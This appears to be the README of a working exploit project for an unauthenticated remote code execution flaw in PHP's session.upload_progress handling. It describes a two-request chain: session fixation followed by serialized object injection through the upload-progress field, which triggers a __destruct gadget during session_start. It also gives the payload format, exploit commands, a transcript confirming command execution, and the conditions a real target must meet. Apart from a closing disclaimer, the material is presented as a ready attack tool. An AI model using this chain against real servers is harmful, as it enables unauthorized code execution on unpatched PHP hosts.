# CVE-2026-109618 / CVE-2026-109619 — PHP session.upload_progress exploit

Unauthenticated RCE in PHP core's `session.upload_progress` handling
(CVSS v4.0 9.2, both CVEs). Fixes shipped 2026-10-21 (8.2.35 / 8.3.36 /
8.4.27 / 8.5.12); every earlier PHP with `session.upload_progress` — 5.4.0
through 8.5.11 — is affected. Mitigation: `session.upload_progress.enabled = Off`.

This project contains a working exploit (`exploit.py`) and a Docker target environment that
reproduces the vulnerable host profile (nginx + php-fpm 8.2.34, per-directory
`session.serialize_handler`).

## The chain (two unauthenticated requests)

```
[1] SEED   POST <php_serialize dir>
          multipart fields: PHPSESSID=<sid>                    (session fixation
                           PHP_SESSION_UPLOAD_PROGRESS=|<serialized payload>  via POST body)
          + one file part
          -> the upload-progress key becomes `upload_progress_|<payload>` and is
             stored verbatim inside the php_serialize session blob.

[2] FIRE   GET <php dir> with Cookie: PHPSESSID=<sid>
          -> the app's session_start() decodes with the default `php` handler,
             which splits the blob at the FIRST `|` (ours) and unserializes the
             payload: object injection. Trailing container data forces a decode
             FAILURE -> var_destroy -> the injected object's __destruct runs
             INSIDE session_start().
```

The exploit injects `O:<Gadget>:1:{<prop>:"<cmd>"}` — any loaded class whose
`__destruct` executes or calls into something with the property you control.
Default gadget: `Logger->cmd` (defined by the target's `api/app.php`, standing in
for real app/preload classes). Payload: ~48 bytes.

## Layout

```
exploit.py          the exploit (stdlib only)
Dockerfile         vulnerable target environment: nginx + php-fpm 8.2.34
nginx-site.conf    target vhost
webroot/app/       seed dir   (.user.ini -> session.serialize_handler=php_serialize)
webroot/api/       fire dir   (.user.ini -> php), Logger gadget class
```

## Usage

```bash
# 1. build & start the target environment
docker build -t cve-2026-109618-exploit .
docker run -d --name cve618 -p 8080:80 cve-2026-109618-exploit

# 2. verify it is up
curl http://127.0.0.1:8080/api/app.php        # -> [api] session started

# 3. exploit
python3 exploit.py 127.0.0.1 8080 "id; uname -a"
python3 exploit.py 127.0.0.1 8080 "cat /etc/hostname" --sid deadbeef0000000000000000000caf
python3 exploit.py host port "cmd" --gadget Monolog --prop target  # real-target gadget
```

Verified transcript against this environment (PHP 8.2.34-fpm):

```
$ python3 exploit.py 127.0.0.1 8080 "id; uname -sr"
[1] seed  POST /app/seed.php -> HTTP 200
[2] fire  GET  /api/app.php -> HTTP 200
[gadget] uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 7.2.9-...
[+] command output seen — RCE confirmed
```

The command output appears in the trigger response: `__destruct` (and thus
`system()`) runs during `session_start()`'s decode-failure cleanup, before the
script body — followed by the expected
`Failed to decode session object. Session has been destroyed` warning.

## What a real target needs

| Condition | Why |
|---|---|
| `session.upload_progress.enabled=On` (default) | the injection channel |
| `session.upload_progress.cleanup=Off` | keeps the seeded payload on disk (with the default `On` only a race window remains) |
| two reachable dirs with different `session.serialize_handler` (`.user.ini` / `.htaccess`) | write side php_serialize, read side php — the `|` split |
| a class with a useful `__destruct` loaded when `session_start()` runs (app code, `opcache.preload`, `auto_prepend_file`) | the RCE gadget; `--gadget/--prop` to match it |
| `session.use_strict_mode=0` (default) | attacker-chosen session id via the POST `PHPSESSID` field (bypasses `use_only_cookies`) |

Note: the payload must ride the **`PHP_SESSION_UPLOAD_PROGRESS` field value**,
not the uploaded filename — multipart part-header lines are capped at ~5 KB and
truncate larger payloads.

## Disclaimer

For authorized security testing and research only. Run it against your own test
environments or systems you have explicit permission to test.
